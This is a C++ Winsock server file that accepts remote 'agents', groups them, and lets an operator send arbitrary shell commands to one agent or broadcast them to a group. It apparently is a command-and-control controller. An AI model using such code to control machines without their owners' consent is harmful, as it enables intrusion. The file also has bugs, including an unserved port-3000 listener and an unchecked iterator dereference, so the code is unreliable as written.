#include "Server1.hpp"

Server1::~Server1() {
    std::cout << "destructor!\n";
    for (AgentConnection* conn : arrAgentConnections) {
        delete conn;
    }
}


INT Server1::StartServer() {
    WSADATA wsaData;
    SOCKET arrListeningSockets[2];
    std::thread arrThreads[2];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    CreateListeningSocket(3000, arrListeningSockets[0]);
    CreateListeningSocket(3001, arrListeningSockets[1]);

    // Start listener threads
    bIsRunning = TRUE;

    arrThreads[1] = std::thread([this, arrListeningSockets] {
        this->ListenForTcpPort(3001, arrListeningSockets[1]);
        });

    std::cout << "[+] Listening for clients on port 3000\n";
    std::cout << "[+] Listening for agents on port 3001\n";

    HandleUserInput();

    arrThreads[1].join();

    closesocket(arrListeningSockets[0]);
    WSACleanup();

    return 0;
}


BOOL Server1::CreateListeningSocket(INT port, SOCKET& outSocket) {

    outSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (outSocket == INVALID_SOCKET)
        return FALSE;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(outSocket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR ||
        listen(outSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        closesocket(outSocket);
        outSocket = INVALID_SOCKET;
        return FALSE;
    }

    return TRUE;
}


BOOL Server1::ListenForTcpPort(INT nPort, SOCKET listeningSocket)
{
    INT nAddrLen;
    INT nSocketReadResult;
    sockaddr_in clientAddr;

    nAddrLen = sizeof(clientAddr);
    InitMasterSet();
    AddSocketToMaster(listeningSocket);

    while (bIsRunning) {
        SetReadSetAsMaster();
        nSocketReadResult = WaitForSocketRead();

        if (nSocketReadResult == SOCKET_ERROR) {
            std::cerr << "select() failed\n";
            break;
        }

        // Check for new connections
        if (IsSocketInSet(listeningSocket)) {
            SOCKET clientSocket = accept(listeningSocket, (sockaddr*)&clientAddr, &nAddrLen);

            if (clientSocket != INVALID_SOCKET) {
                AddAgentConnection(clientSocket);
            }
        }

        // Check for data or closed connections
        std::unique_lock<std::mutex> lock(mAgentConnectionsMutex);

        for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
            AgentConnection* conn = *connectionsIterator;

            if (IsSocketInSet(conn->GetSocket())) {
                std::string szData;
                BOOL bIsConnectionAlive;
                bIsConnectionAlive = conn->ReceiveData(TRUE, szData);

                if (!bIsConnectionAlive) {
                    std::cout << "[-] Disconnected from " << conn->GetSocketStr() << "\n";
                    connectionsIterator = RemoveAgentConnection(connectionsIterator);
                }
                else {
                    ++connectionsIterator;
                }
            }
            else {
                ++connectionsIterator;
            }
        }

        lock.unlock();
    }

    return TRUE;
}


std::vector<AgentConnection*> Server1::GetAgentConnections() const {
    //std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
    return arrAgentConnections;
}

VOID Server1::AddAgentConnection(SOCKET socket) {
    //std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
    AgentConnection* agentCon = new AgentConnection(socket);
    arrAgentConnections.push_back(agentCon);
    AddSocketToMaster(socket);
    std::cout << "[+] Connected to " << agentCon->GetSocketStr() << "\n";
    PrintActiveAgentSockets();
}

std::vector<AgentConnection*>::iterator Server1::RemoveAgentConnection(std::vector<AgentConnection*>::iterator& connectionIterator) {
    RemoveConnectionFromAllGroups(*connectionIterator);
    RemoveSocketFromSet((*connectionIterator)->GetSocket());
    delete *connectionIterator;
    auto iterator = arrAgentConnections.erase(connectionIterator);
    PrintActiveAgentSockets();
    return iterator;
}

VOID Server1::PrintActiveAgentSockets() {
    if (arrAgentConnections.size() == 0) {
        std::cout << "[+] No active sockets\n";
    }
    else {
        std::cout << "[+] Active sockets:\n";

        for (AgentConnection* conn : arrAgentConnections) {
            std::cout << "[+] Connected to " << conn->GetSocketStr() << "\n";
        }
    }
}


std::vector<AgentConnection*>::iterator Server1::FindConnectionFromSocketStr(std::string szSocket) {
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
        AgentConnection* conn = *connectionsIterator;

        if (conn->GetSocketStr() == szSocket) {
            return connectionsIterator;
        }

        ++connectionsIterator;
    }

    std::cout << "Could not find connection " << szSocket << "\n";
    return arrAgentConnections.end();
}

VOID Server1::RemoveConnectionFromAllGroups(AgentConnection* conn)
{
    auto arrGroups = conn->GetGroups();
    for (auto group : arrGroups) {
        groupManager.RemoveConnectionFromGroup(group, conn);
    }
}


VOID Server1::HandleUserInput() {
    while (bIsRunning) {
        std::string input;
        std::cout << "Enter Full command: ";
        std::getline(std::cin, input);

        std::istringstream iss(input);
        std::string command;
        iss >> command;

        std::vector<std::string> parameters;
        std::string param;

        while (iss >> param) {
            parameters.push_back(param);
        }

        for (const auto& p : parameters) {
            std::cout << "- " << p << "\n";
        }

        if (command == "quit") {
            bIsRunning = FALSE;
        }
        else if (command == "close") {
            if (parameters.size() != 1) {
                std::cout << "[!] Invalid parametrs for close command\n";
            }
            else {
                UserCloseConnection(parameters[0]);
            }
        }
        else if (command == "cmd") {
            UserRunCommand(parameters);
        }
        else if (command == "list") {
            PrintActiveAgentSockets();
        }
        else if (command == "group-cmd") {
            if (parameters.size() > 1) {
                //groupManager.BroadcastToGroup(parameters);
                UserRunCommandOnGroup(parameters);
            }
            else {
                std::cout << "[!] Invalid parametrs for group-create command\n";
            }
        }
        else if (command == "group-create") {
            if (parameters.size() == 1) {
                groupManager.CreateGroup(parameters[0]);
            }
            else {
                std::cout << "[!] Invalid parametrs for group-create command\n";
            }
        }
        else if (command == "group-add") {
            if (parameters.size() == 2) {
                AgentConnection* conn = *FindConnectionFromSocketStr(parameters[1]);
                groupManager.AddConnectionToGroup(parameters[0], conn);
            }
            else {
                std::cout << "[!] Invalid parametrs for group-add command\n";
            }
        }
        else if (command == "group-list") {
            if (parameters.size() == 1) {
                groupManager.ListGroupMembers(parameters[0]);
            }
            else {
                std::cout << "[!] Invalid parametrs for group-list command\n";
            }
        }
        else if (command == "group-delete") {
            if (parameters.size() == 1) {
                groupManager.DeleteGroup(parameters[0]);
            }
            else {
                std::cout << "[!] Invalid parametrs for group-delete command\n";
            }
        }
        else if (command == "man") {
            UserShowMan();
        }
        else if (command != "") {
            std::cout << "[!] Unrecogzied command\n";
            UserShowMan();
        }
    }

}


VOID Server1::UserCloseConnection(std::string szSocket) {
    auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    if (connectionsIterator != arrAgentConnections.end()) {
        RemoveAgentConnection(connectionsIterator);
    }
}


VOID Server1::UserRunCommand(const std::vector<std::string>& arrParameters) {
    std::string szCommand;
    std::string szSocket;

    if (arrParameters.size() < 2) {
        std::cout << "Not enough parameters provided.\n";
        return;
    }

    for (size_t i = 0; i < arrParameters.size() - 1; ++i) {
        szCommand += arrParameters[i];
        if (i < arrParameters.size() - 2)
            szCommand += " ";
    }

    szSocket = arrParameters.back();

    //std::cout << "Combined parameters: " << szCommand << "\n";
    //std::cout << "Last parameter: " << szSocket << "\n";

    auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    if (connectionsIterator != arrAgentConnections.end()) {
        std::string szData;
        (*connectionsIterator)->SendCommand(szCommand);
        (*connectionsIterator)->ReceiveData(FALSE, szData);
        std::cout << "[*] received from " << (*connectionsIterator)->GetSocketStr() << " : \n" << szData << "\n";
    }

}

VOID Server1::UserRunCommandOnGroup(const std::vector<std::string>& arrParameters)
{
    std::string szGroupName = arrParameters[0];
    std::string szCommand;


    for (size_t i = 1; i < arrParameters.size(); ++i) {
        szCommand += arrParameters[i];
        if (i < arrParameters.size() - 1) {
            szCommand += " ";
        }
    }

    groupManager.BroadcastToGroup(szGroupName, szCommand);
    
}


VOID Server1::UserShowMan() {
    std::cout << "[*] quit - Kill server and all connections\n";
    std::cout << "[*] close IP:PORT - Close connection with IP:PORT\n";
    std::cout << "[*] cmd COMMAND IP:PORT - Execute COMMAND on IP:PORT\n";
    std::cout << "[*] list - Show all active connections\n";
    std::cout << "[*] group-create - Create a new control group\n";
    std::cout << "[*] group-delete GROUPNAME - Delete GROUPNAME control group\n";
    std::cout << "[*] group-add GROUPNAME IP:PORT - Add IP:PORT to GROUPNAME control group\n";
    std::cout << "[*] group-remove GROUPNAME IP:PORT - Remove IP:PORT from GROUPNAME control group\n";
    std::cout << "[*] group-list GROUPNAME - Print the members of GROUPNAME control group\n";
    std::cout << "[*] groups - Print all active control groups\n";
    std::cout << "[*] man - Show this man page\n";
}


fd_set Server1::GetMasterSet() {
    return masterSet;
}

fd_set Server1::GetReadSet() {
    return readSet;
}
VOID Server1::InitMasterSet() {
    FD_ZERO(&masterSet);
}


VOID Server1::SetReadSetAsMaster() {
    readSet = masterSet;
}


VOID Server1::AddSocketToMaster(SOCKET socket) {
    FD_SET(socket, &masterSet);
}


INT Server1::WaitForSocketRead() {
    timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    return select(0, &readSet, NULL, NULL, &timeout);
}


BOOL Server1::IsSocketInSet(SOCKET socket) {
    return FD_ISSET(socket, &readSet);
}


VOID Server1::RemoveSocketFromSet(SOCKET socket) {
    FD_CLR(socket, &masterSet);
}
